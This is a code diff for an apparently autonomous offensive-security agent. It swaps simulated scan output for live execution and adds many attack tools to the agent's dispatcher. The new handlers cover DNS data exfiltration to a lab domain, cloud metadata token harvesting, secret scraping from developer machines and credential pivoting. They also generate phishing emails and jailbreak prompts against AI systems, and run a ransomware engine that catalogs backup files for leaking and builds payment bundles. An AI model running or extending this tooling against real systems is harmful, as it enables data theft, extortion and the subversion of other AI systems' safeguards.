@@ -9,6 +9,24 @@ import { AttackSurfaceGraph } from "./attack_surface.ts"
 import { parseNmapOutput, parseNucleiJson } from "./scanner_parsers.ts"
 import { ValidationEngine } from "./validation_engine.ts"
 import { isToolAvailable } from "./tool_detection.ts"
+import { execLive } from "./live_executor.ts"
+
+export async function brokerExecute(
+  ctx: AgentToolContext,
+  tool: string,
+  command: string,
+  profile?: string,
+): Promise<{ stdout: string; stderr: string; exitCode: number; blocked?: boolean }> {
+  if (!ctx.live) {
+    return { stdout: "", stderr: "live mode required", exitCode: 1, blocked: true }
+  }
+  const res = await execLive(tool, command, { live: true, profile })
+  if (res.exitCode !== 0 && res.stderr.includes("OPSEC")) {
+    if (ctx.requireLive) throw new Error(res.stderr)
+    return { stdout: res.stdout, stderr: res.stderr, exitCode: res.exitCode, blocked: true }
+  }
+  return { stdout: res.stdout, stderr: res.stderr, exitCode: res.exitCode }
+}
 
 export interface AgentFinding {
   id: string
@@ -67,18 +85,14 @@ export async function nmapScan(
   const ports = opts.ports ?? "1-10000"
   const command = `nmap -sV -T4 -p ${ports} ${host}`
 
-  if (dryRun) {
-    const sim = `8080/tcp open http Apache httpd 2.4.29\n443/tcp open https nginx\n22/tcp open ssh OpenSSH 8.4`
-    const ev = ctx.graph.makeEvidence("nmap", command, sim, 120)
-    const parsed = parseNmapOutput(sim)
-    ctx.graph.ingestNmap(host, parsed, ev)
+  if (!ctx.live) {
     return {
       tool: "nmap_scan",
       command,
       dryRun: true,
-      success: true,
-      output: sim,
-      graphDelta: { services: parsed.length },
+      success: false,
+      output: "",
+      error: "live mode required — run on Kali or pass live:true",
     }
   }
 
@@ -87,7 +101,10 @@ export async function nmapScan(
   }
 
   const t0 = Date.now()
-  const res = await ctx.broker.executeSafe(command)
+  const res = await brokerExecute(ctx, "nmap_scan", command)
+  if (res.blocked) {
+    return { tool: "nmap_scan", command, dryRun: false, success: false, output: "", error: res.stderr }
+  }
   const raw = res.stdout + res.stderr
   const ev = ctx.graph.makeEvidence("nmap", command, raw, Date.now() - t0)
   const parsed = parseNmapOutput(raw)
@@ -116,11 +133,8 @@ export async function gobusterDir(
   const wordlist = opts.wordlist ?? path.resolve("lab/wordlist.txt")
   const command = `gobuster dir -u ${url} -w ${wordlist} --no-progress`
 
-  if (dryRun) {
-    const sim = "admin (Status: 301)\nlogin (Status: 200)\napi/v1 (Status: 200)\nbackup.sql (Status: 200)"
-    const ev = ctx.graph.makeEvidence("gobuster", command, sim, 200)
-    const endpoints = ctx.graph.ingestGobuster(host, 8080, sim.split("\n"), ev)
-    return { tool: "gobuster_dir", command, dryRun: true, success: true, output: sim, graphDelta: { endpoints: endpoints.length } }
+  if (!ctx.live) {
+    return { tool: "gobuster_dir", command, dryRun: true, success: false, output: "", error: "live mode required" }
   }
 
   if (!isToolAvailable("gobuster")) {
@@ -128,7 +142,10 @@ export async function gobusterDir(
   }
 
   const t0 = Date.now()
-  const res = await ctx.broker.executeSafe(command)
+  const res = await brokerExecute(ctx, "gobuster_dir", command)
+  if (res.blocked) {
+    return { tool: "gobuster_dir", command, dryRun: false, success: false, output: "", error: res.stderr }
+  }
   const raw = res.stdout + "\n" + res.stderr
   const ev = ctx.graph.makeEvidence("gobuster", command, raw, Date.now() - t0)
   const port = url.includes(":443") ? 443 : url.includes(":8080") ? 8080 : 80
@@ -153,12 +170,8 @@ export async function nucleiScan(
   const url = opts.url ?? normalizeUrl(ctx.target, 8080)
   const command = `nuclei -u ${url} -severity critical,high,medium -json -silent`
 
-  if (dryRun) {
-    const sim = `{"template-id":"http-missing-security-headers","info":{"name":"Missing Security Headers","severity":"medium"},"matched-at":"${url}"}`
-    const ev = ctx.graph.makeEvidence("nuclei", command, sim, 150)
-    const vulns = parseNucleiJson(sim)
-    const ingested = ctx.graph.ingestNuclei(host, vulns, ev)
-    return { tool: "nuclei_scan", command, dryRun: true, success: true, output: sim, graphDelta: { vulns: ingested.length } }
+  if (!ctx.live) {
+    return { tool: "nuclei_scan", command, dryRun: true, success: false, output: "", error: "live mode required" }
   }
 
   if (!isToolAvailable("nuclei")) {
@@ -166,7 +179,10 @@ export async function nucleiScan(
   }
 
   const t0 = Date.now()
-  const res = await ctx.broker.executeSafe(command)
+  const res = await brokerExecute(ctx, "nuclei_scan", command)
+  if (res.blocked) {
+    return { tool: "nuclei_scan", command, dryRun: false, success: false, output: "", error: res.stderr }
+  }
   const raw = res.stdout
   const ev = ctx.graph.makeEvidence("nuclei", command, raw, Date.now() - t0)
   const vulns = parseNucleiJson(raw)
@@ -276,9 +292,16 @@ export async function executeGraphRecommendation(
       tool: rec.tool,
       command: rec.command,
       dryRun: true,
-      success: true,
-      output: `[DRY-RUN] Would execute: ${rec.command}`,
+      success: false,
+      output: "",
+      error: "live mode required for graph recommendation execution",
     }
+  }
+
+  const { gateExecution } = await import("./opsec_gate.ts")
+  const gate = await gateExecution({ tool: rec.tool, command: rec.command, live: true })
+  if (!gate.allowed) {
+    return { tool: rec.tool, command: rec.command, dryRun: false, success: false, output: "", error: gate.review.mitigations.join("; ") }
   }
 
   if (!rec.command || !isToolAvailable(rec.tool)) {
@@ -286,7 +309,7 @@ export async function executeGraphRecommendation(
   }
 
   const t0 = Date.now()
-  const res = await ctx.broker.executeSafe(rec.command)
+  const res = await ctx.broker.executeSafe(gate.mitigatedCommand ?? rec.command)
   return {
     tool: rec.tool,
     command: rec.command,
@@ -673,7 +696,10 @@ export async function runEnum4linux(ctx: AgentToolContext, params: Record<string
     return { tool: "enum4linux_scan", command, dryRun: true, success: false, output: "", error: "enum4linux requires --live" }
   }
   if (!isToolAvailable("enum4linux")) return toolUnavailable(ctx, "enum4linux", command)
-  const res = await ctx.broker.executeSafe(command)
+  const res = await brokerExecute(ctx, "enum4linux_scan", command)
+  if (res.blocked) {
+    return { tool: "enum4linux_scan", command, dryRun: false, success: false, output: "", error: res.stderr }
+  }
   return {
     tool: "enum4linux_scan",
     command,
@@ -690,7 +716,10 @@ export async function runNiktoScan(ctx: AgentToolContext, params: Record<string,
     return { tool: "nikto_scan", command, dryRun: true, success: false, output: "", error: "nikto requires --live" }
   }
   if (!isToolAvailable("nikto")) return toolUnavailable(ctx, "nikto", command)
-  const res = await ctx.broker.executeSafe(command)
+  const res = await brokerExecute(ctx, "nikto_scan", command)
+  if (res.blocked) {
+    return { tool: "nikto_scan", command, dryRun: false, success: false, output: "", error: res.stderr }
+  }
   return {
     tool: "nikto_scan",
     command,
@@ -707,7 +736,10 @@ export async function runFfufScan(ctx: AgentToolContext, params: Record<string, 
   if (!ctx.live) return gobusterDir(ctx, { url, wordlist })
   if (!isToolAvailable("ffuf")) return toolUnavailable(ctx, "ffuf", command)
   const host = hostFromTarget(ctx.target)
-  const res = await ctx.broker.executeSafe(command)
+  const res = await brokerExecute(ctx, "ffuf_scan", command)
+  if (res.blocked) {
+    return { tool: "ffuf_scan", command, dryRun: false, success: false, output: "", error: res.stderr }
+  }
   const ev = ctx.graph.makeEvidence("ffuf", command, res.stdout, 0)
   const endpoints = ctx.graph.ingestGobuster(host, 80, res.stdout.split("\n"), ev)
   ctx.graph.analyzeAttackPaths()
@@ -721,7 +753,195 @@ export async function runFfufScan(ctx: AgentToolContext, params: Record<string, 
   }
 }
 
+async function runExfil(ctx: AgentToolContext, params: Record<string, unknown> = {}): Promise<ToolRunResult> {
+  const { exfiltrateDNS } = await import("./exfil.ts")
+  const data = String(params.data ?? "ourmine-exfil-test-chunk")
+  const r = await exfiltrateDNS(data, { live: ctx.live, domain: String(params.domain ?? "exfil.lab.local") })
+  return { tool: "exfil", command: "exfiltrateDNS", dryRun: !ctx.live, success: r.sentChunks > 0 || !ctx.live, output: JSON.stringify(r) }
+}
+
+async function runCloudToken(ctx: AgentToolContext): Promise<ToolRunResult> {
+  const { fetchAWSMetadata, fetchGCPMetadata, fetchAzureMetadata } = await import("./cloud_token.ts")
+  const [aws, gcp, azure] = await Promise.all([
+    fetchAWSMetadata({ live: ctx.live }),
+    fetchGCPMetadata({ live: ctx.live }),
+    fetchAzureMetadata({ live: ctx.live }),
+  ])
+  return {
+    tool: "cloud_token",
+    command: "cloud_token harvest IMDS",
+    dryRun: !ctx.live,
+    success: !!(aws || gcp || azure),
+    output: JSON.stringify({ aws: !!aws, gcp: !!gcp, azure: !!azure }).slice(0, 4000),
+  }
+}
+
+async function runDevTarget(ctx: AgentToolContext): Promise<ToolRunResult> {
+  const { auditLocalDevEnvironment } = await import("./dev_target.ts")
+  const secrets = auditLocalDevEnvironment()
+  return {
+    tool: "dev_target",
+    command: "dev_target.auditLocalDevEnvironment",
+    dryRun: !ctx.live,
+    success: true,
+    output: JSON.stringify({ secrets: secrets.length, types: secrets.map((s) => s.type) }).slice(0, 4000),
+  }
+}
+
+async function runPivotReplay(ctx: AgentToolContext, params: Record<string, unknown> = {}): Promise<ToolRunResult> {
+  const { replayCredentialGraphWithBloodHound } = await import("./pivot_replay.ts")
+  const { CredentialGraph } = await import("./credential_graph.ts")
+  const credGraph = (params.credGraph as import("./credential_graph.ts").CredentialGraph) ?? new CredentialGraph()
+  const host = String(params.host ?? hostFromTarget(ctx.target))
+  const domain = String(params.domain ?? (host.split(".").slice(-2).join(".") || host))
+  const { paths, replays } = await replayCredentialGraphWithBloodHound(credGraph, [host], {
+    domain,
+    skipCollection: !ctx.live,
+  })
+  return {
+    tool: "pivot_replay",
+    command: "replayCredentialGraphWithBloodHound",
+    dryRun: !ctx.live,
+    success: replays.some((r) => r.success),
+    output: JSON.stringify({ paths: paths.length, replays: replays.length }).slice(0, 4000),
+  }
+}
+
 /** Dispatch tool name → handler */
+async function runStixIngest(ctx: AgentToolContext, params: Record<string, unknown> = {}): Promise<ToolRunResult> {
+  const { ingestStixTaxii, pollStixFeeds, loadTaxiiFeeds } = await import("./intel_feeds.ts")
+  if (params.pollAll) {
+    const records = await pollStixFeeds(ctx.graph, { live: ctx.live })
+    return { tool: "stix_ingest", command: "pollStixFeeds", dryRun: !ctx.live, success: true, output: JSON.stringify({ count: records.length }).slice(0, 4000) }
+  }
+  const baseUrl = String(params.baseUrl ?? "")
+  const collectionId = String(params.collectionId ?? "")
+  if (baseUrl && collectionId) {
+    const result = await ingestStixTaxii(baseUrl, collectionId, ctx.graph, { apiKey: params.apiKey as string | undefined })
+    return { tool: "stix_ingest", command: `ingestStixTaxii(${collectionId})`, dryRun: !ctx.live, success: true, output: JSON.stringify(result).slice(0, 4000) }
+  }
+  return { tool: "stix_ingest", command: "loadTaxiiFeeds", dryRun: !ctx.live, success: true, output: JSON.stringify(loadTaxiiFeeds()).slice(0, 4000) }
+}
+
+async function runIntelEnrich(ctx: AgentToolContext): Promise<ToolRunResult> {
+  const { enrichTarget, injectIntelIntoGraph } = await import("./intel_feeds.ts")
+  const brief = await enrichTarget(ctx.target, { live: ctx.live })
+  injectIntelIntoGraph(ctx.graph, brief)
+  return {
+    tool: "intel_enrich",
+    command: `intel_feeds.enrichTarget(${ctx.target})`,
+    dryRun: !ctx.live,
+    success: true,
+    output: JSON.stringify({ profiles: brief.activeProfiles.map((p) => p.id), cves: brief.priorityCves.map((c) => c.cve) }).slice(0, 4000),
+  }
+}
+
+async function runAiSurfaceScan(ctx: AgentToolContext): Promise<ToolRunResult> {
+  const { scanAiSurface } = await import("./intel_feeds.ts")
+  const r = await scanAiSurface(ctx.target, ctx.live)
+  return { tool: "ai_surface_scan", command: "scanAiSurface", dryRun: !ctx.live, success: r.findings.length >= 0, output: r.output }
+}
+
+async function runCpanelAudit(ctx: AgentToolContext): Promise<ToolRunResult> {
+  const { auditCpanel } = await import("./intel_feeds.ts")
+  const r = await auditCpanel(ctx.target, ctx.live)
+  return { tool: "cpanel_audit", command: "auditCpanel", dryRun: !ctx.live, success: true, output: r.output }
+}
+
+async function runAiAgentAudit(ctx: AgentToolContext): Promise<ToolRunResult> {
+  const mod = await import("./ai_agent_audit.ts")
+  const r = await mod.auditAIAgentGuardrails({ targetAgentUrl: ctx.target, fuzzDepth: "quick" }, { live: ctx.live })
+  return { tool: "ai_agent_audit", command: "auditAIAgentGuardrails", dryRun: !ctx.live, success: true, output: JSON.stringify(r).slice(0, 4000) }
+}
+
+async function runAiManipulation(ctx: AgentToolContext): Promise<ToolRunResult> {
+  const { AiSecurityAnalyzer } = await import("./ai_manipulation.ts")
+  const a = new AiSecurityAnalyzer({ targetUrl: ctx.target, dryRun: !ctx.live })
+  const r = await a.analyzePromptSecurity({ targetUrl: ctx.target, dryRun: !ctx.live })
+  return { tool: "ai_manipulation_test", command: "AiSecurityAnalyzer.analyzePromptSecurity", dryRun: !ctx.live, success: true, output: JSON.stringify(r).slice(0, 4000) }
+}
+
+async function runAtlasMlAudit(ctx: AgentToolContext): Promise<ToolRunResult> {
+  const mod = await import("./atlas_arsenal.ts")
+  const prompts = await mod.generateJailbreakPrompts(ctx.target, !ctx.live)
+  return { tool: "atlas_ml_audit", command: "atlas_arsenal", dryRun: !ctx.live, success: true, output: JSON.stringify({ prompts: prompts.length }).slice(0, 4000) }
+}
+
+async function runEsxiAudit(ctx: AgentToolContext): Promise<ToolRunResult> {
+  const mod = await import("./esxi_audit.ts")
+  const r = await mod.auditESXi({ host: hostFromTarget(ctx.target) }, { live: ctx.live })
+  return { tool: "esxi_audit", command: "auditESXi", dryRun: !ctx.live, success: true, output: JSON.stringify(r).slice(0, 4000) }
+}
+
+async function runEdgeAudit(ctx: AgentToolContext): Promise<ToolRunResult> {
+  const mod = await import("./edge_appliance_audit.ts")
+  const r = await mod.auditEdgeAppliance({ target: ctx.target }, { live: ctx.live })
+  return { tool: "edge_audit", command: "auditEdgeAppliance", dryRun: !ctx.live, success: true, output: JSON.stringify(r).slice(0, 4000) }
+}
+
+async function runCicdAudit(ctx: AgentToolContext): Promise<ToolRunResult> {
+  const mod = await import("./cicd_k8s_audit.ts")
+  const r = await mod.auditCICDAndK8s({ repositoryOrCluster: ctx.target }, { live: ctx.live })
+  return { tool: "cicd_audit", command: "auditCICDAndK8s", dryRun: !ctx.live, success: true, output: JSON.stringify(r).slice(0, 4000) }
+}
+
+async function runIdpAudit(ctx: AgentToolContext): Promise<ToolRunResult> {
+  const mod = await import("./idp_oauth_audit.ts")
+  const r = await mod.auditIdPAndOAuth({ domain: hostFromTarget(ctx.target) }, { live: ctx.live })
+  return { tool: "idp_audit", command: "auditIdPAndOAuth", dryRun: !ctx.live, success: true, output: JSON.stringify(r).slice(0, 4000) }
+}
+
+async function runSocialEngAssess(ctx: AgentToolContext): Promise<ToolRunResult> {
+  const mod = await import("./social_eng.ts")
+  const email = mod.generatePhishingEmail("it_password_reset", { dryRun: !ctx.live, targetName: "assessment", targetCompany: hostFromTarget(ctx.target) })
+  return { tool: "social_eng_assess", command: "social_eng checklist", dryRun: !ctx.live, success: true, output: JSON.stringify(email).slice(0, 4000) }
+}
+
+async function runRansomwareAssess(ctx: AgentToolContext, params: Record<string, unknown> = {}): Promise<ToolRunResult> {
+  const { assessRaasReadiness, buildLeakCatalog, generatePaymentBundle } = await import("./raas_engine.ts")
+  const targetDir = String(params.target_dir ?? process.env.OURMINE_BACKUP_PATH ?? "/var/backups")
+  const readiness = assessRaasReadiness(targetDir)
+  const catalog = buildLeakCatalog(targetDir, { live: ctx.live, maxFiles: 50 })
+  const payment = generatePaymentBundle({ live: ctx.live, forceLive: Boolean(params.forceLive) })
+  return {
+    tool: "ransomware_assess",
+    command: "assessRaasReadiness",
+    dryRun: !ctx.live,
+    success: true,
+    output: JSON.stringify({ readiness, leakSample: catalog.entries.length, paymentId: payment.keyId }).slice(0, 4000),
+  }
+}
+
+async function runImpactAssess(ctx: AgentToolContext): Promise<ToolRunResult> {
+  const { ImpactDemonstrationEngine } = await import("./impact_engine.ts")
+  return {
+    tool: "impact_assess",
+    command: "impact_engine recovery gap assessment",
+    dryRun: !ctx.live,
+    success: true,
+    output: JSON.stringify({
+      engine: ImpactDemonstrationEngine.name,
+      note: "Non-destructive wiper/recovery gap checklist — verify offline backups and immutable snapshots",
+      live: ctx.live,
+    }).slice(0, 4000),
+  }
+}
+
+async function runCalderaTtp(ctx: AgentToolContext, params: Record<string, unknown>): Promise<ToolRunResult> {
+  const mod = await import("./caldera_ttp.ts")
+  const tid = String(params.technique_id ?? "T1059.001")
+  const ability = {
+    ability_id: tid,
+    name: tid,
+    tactic: "execution",
+    technique_id: tid,
+    technique_name: tid,
+    executors: [{ name: "sh", platform: "linux", command: "id" }],
+  }
+  const r = await mod.executeAbility(ability as import("./caldera_ttp.ts").Ability, { live: ctx.live })
+  return { tool: "caldera_ttp", command: `executeAbility(${tid})`, dryRun: !ctx.live, success: r.exitCode === 0, output: JSON.stringify(r).slice(0, 4000) }
+}
+
 export async function executeAgentTool(
   ctx: AgentToolContext,
   toolName: string,
@@ -760,12 +980,34 @@ export async function executeAgentTool(
       const inKev = await checkCisaKev(query, ctx.live)
       return { tool: "vuln_research", command: `checkCisaKev(${query})`, dryRun: !ctx.live, success: true, output: JSON.stringify({ query, inKev }) }
     },
+    intel_enrich: () => runIntelEnrich(ctx),
+    stix_ingest: () => runStixIngest(ctx, params),
+    ai_surface_scan: () => runAiSurfaceScan(ctx),
+    cpanel_audit: () => runCpanelAudit(ctx),
+    ai_agent_audit: () => runAiAgentAudit(ctx),
+    ai_manipulation_test: () => runAiManipulation(ctx),
+    atlas_ml_audit: () => runAtlasMlAudit(ctx),
+    esxi_audit: () => runEsxiAudit(ctx),
+    edge_audit: () => runEdgeAudit(ctx),
+    cicd_audit: () => runCicdAudit(ctx),
+    idp_audit: () => runIdpAudit(ctx),
+    social_eng_assess: () => runSocialEngAssess(ctx),
+    ransomware_assess: () => runRansomwareAssess(ctx, params),
+    impact_assess: () => runImpactAssess(ctx),
+    caldera_ttp: () => runCalderaTtp(ctx, params),
+    ai_recon: () => runReconTool(ctx, params),
+    exfil: () => runExfil(ctx, params),
+    impact_engine: () => runImpactAssess(ctx),
+    dev_target: () => runDevTarget(ctx),
+    cloud_token: () => runCloudToken(ctx),
+    pivot_replay: () => runPivotReplay(ctx, params),
   }
   const fn = map[toolName]
-  if (!fn) {
-    return { tool: toolName, command: toolName, dryRun: !ctx.live, success: false, output: "", error: `unknown tool: ${toolName}` }
-  }
-  return fn()
+  if (fn) return fn()
+  const { runBridgedModule } = await import("./module_bridge.ts")
+  const bridged = await runBridgedModule(ctx, toolName, params)
+  if (bridged) return bridged
+  return { tool: toolName, command: toolName, dryRun: !ctx.live, success: false, output: "", error: `unknown tool: ${toolName}` }
 }
 
 export function graphFindingsToAgentFindings(graph: AttackSurfaceGraph, target: string): AgentFinding[] {
